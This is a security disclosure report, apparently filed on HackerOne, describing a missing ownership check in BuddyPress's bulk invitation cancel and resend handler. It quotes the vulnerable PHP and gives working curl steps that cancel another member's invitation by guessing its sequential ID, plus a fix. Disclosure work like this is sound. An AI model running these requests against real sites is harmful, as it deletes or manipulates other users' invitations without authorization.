## TL;DR
BuddyPress's bulk invitation manager checks that the request came from *your own*
page — but never checks that the invitation IDs you submitted actually *belong* to
you. Any authenticated member can paste a foreign invitation ID into their own
bulk-cancel or bulk-resend form and have it acted on immediately.
 
Invitation IDs are a shared sequential integer sequence, so guessing a neighbor's
ID takes one request. No admin access needed — just a regular member account and
the network invitations feature being enabled.
 
**One POST. Any invitation. Gone.**
 
## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| BuddyPress | 14.5.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/buddypress.14.5.2.zip) |
| PHP | 8.4.24 (cli) |
| MariaDB | 11.8.8-MariaDB (Debian) |
 
## Description
When network invitations are enabled, every member gets a page to manage the invitations they have personally sent, with bulk cancel and resend actions. The bulk handler proves the request came from the account's own page, but never checks that the invitation IDs submitted actually belong to that account, so a member can list someone else's invitation ID in the bulk form on their own page and have it acted on anyway.
 
## Root Cause
 
- File: `bp-members/actions/invitations-bulk-manage.php:20,25-27`; `bp-members/bp-members-functions.php:3535-3541`
- Vulnerable code:
```php
if ( ! bp_is_my_profile() && ! bp_current_user_can( 'bp_moderate' ) ) {
    return false;
}
$invitations = ! empty( $_POST['members_invitations'] ) ? $_POST['members_invitations'] : '';
...
bp_members_invitations_delete_by_id( $invite_id ); // no ownership check on $invite_id
```
 
- Why it's wrong: `bp_is_my_profile()` proves whose page the request came from, not whose invitations the submitted IDs belong to; `bp_members_invitations_delete_by_id()` and the resend equivalent act on any ID handed to them with no `inviter_id` comparison.
## Steps to Reproduce
 
**Privilege level:** ordinary authenticated member (`attacker`, subscriber) —
not an admin, not the owner of the target invitation.
 
---
 
**Step 1 — Get your own nonce and see the shared ID space**
 
Load the attacker's own invitation list page and extract the nonce + their invitation ID:
 
```bash
curl -s -b attacker_cookies.txt \
  "http://127.0.0.1:8977/members/attacker/invitations/list-invites/" \
  -o attacker_invites.html
 
grep -o 'invitations_bulk_nonce" name="invitations_bulk_nonce" value="[a-f0-9]*"' attacker_invites.html
grep -o 'members_invitations\[\]" value="[0-9]*"' attacker_invites.html
```
 
```
invitations_bulk_nonce" name="invitations_bulk_nonce" value="6fee4ad405"
members_invitations[]" value="3"
```
 
Attacker's own invitation is `id=3`. IDs are a single shared sequence across
all users — not scoped per account — so `id=6` very likely belongs to someone else.
 
---
 
**Step 2 — Cancel a foreign invitation using your own nonce**
 
Submit the bulk-cancel form with a guessed foreign ID (`6`) instead of your own (`3`):
 
```bash
curl -s -b attacker_cookies.txt -c attacker_cookies.txt -L -X POST \
  "http://127.0.0.1:8977/members/attacker/invitations/send-invites/" \
  --data "invitation_bulk_action=cancel&invitations_bulk_nonce=6fee4ad405&members_invitations[]=6"
```
 
```
<p>1 invitation was canceled.</p>
```
 
---
 
**Step 3 — Confirm the deletion was real, not a no-op**
 
Replay the identical request:
 
```bash
curl -s -b attacker_cookies.txt -c attacker_cookies.txt -L -X POST \
  "http://127.0.0.1:8977/members/attacker/invitations/send-invites/" \
  --data "invitation_bulk_action=cancel&invitations_bulk_nonce=6fee4ad405&members_invitations[]=6"
```
 
```
<p>0 invitations were canceled.</p>
```
 
Count dropped `1 → 0` on replay: the first request permanently deleted an
invitation the attacker never owned. No authentication beyond a normal member
session was used at any point.
 
## Recommendation
In `bp_members_invitations_action_bulk_manage()`, load each submitted invitation and skip, or reject the whole batch, if its `inviter_id` does not match the current user, unless the current user has `bp_moderate`.
 
## Impact
Any member who can reach their own invitations screen, which requires only that network invitations be enabled and the member have sent at least one invitation, can cancel or force a resend of any other member's or administrator's pending network invitations by ID, without owning them. No admin cooperation is needed beyond the site having the feature turned on.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
